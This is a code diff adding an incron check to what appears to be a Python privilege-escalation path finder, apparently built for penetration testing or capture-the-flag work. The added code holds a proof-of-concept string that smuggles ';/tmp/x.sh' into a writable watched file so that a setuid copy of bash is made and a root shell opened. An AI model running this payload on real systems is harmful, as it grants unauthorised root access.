@@ -164,6 +164,29 @@ def _add_scheduled_writes(g: Graph, facts: Facts, me: str) -> None:
             continue
         owner = job.owner if job.owner not in ("", "ALL") else ROOT
 
+        # 0) incron: the watched path is the primitive. If we can write it, we
+        # can fire the root-run command (and usually inject into the file it
+        # consumes). This is the HTB "Connected" class of vector.
+        if job.kind == "incron" and job.trigger_path:
+            t_hit = (writable_index.get(job.trigger_path)
+                     or writable_index.get(_parent(job.trigger_path)))
+            if t_hit:
+                g.add_edge(Edge(
+                    src=_writer_source(t_hit.writable_via, me),
+                    dst=user_node(owner), category=WRITABLE_EXEC,
+                    title=f"modify incron-watched path run by {owner}",
+                    detail=f"{job.source}: incrond runs '{job.command}' as {owner} "
+                           f"on changes to {job.trigger_path}; writable via "
+                           f"{t_hit.writable_via} ({t_hit.note})",
+                    poc=(f"printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash; "
+                         f"chmod +sx /tmp/rootbash\\n' > /tmp/x.sh; chmod +x /tmp/x.sh; "
+                         f"echo ';/tmp/x.sh' >> {job.trigger_path}; "
+                         f"touch {job.trigger_path}; sleep 3; /tmp/rootbash -p"),
+                    requires=(f"incrond running; the root command must consume the "
+                              f"watched file's content/name (else the write only "
+                              f"triggers '{job.command}')"),
+                ))
+
         # 1) direct file / parent-dir writability
         hit = writable_index.get(exe) or writable_index.get(_parent(exe))
         if hit:
@@ -275,6 +298,7 @@ def _parent(path: str) -> str:
 
 
 def _job_executable(command: str) -> str | None:
+    # (returns the path an event/time job executes; incron joins on trigger_path)
     if not command.strip():
         return None
     # strip common shell wrappers: "/bin/sh -c '...'", "/bin/bash -c ..."
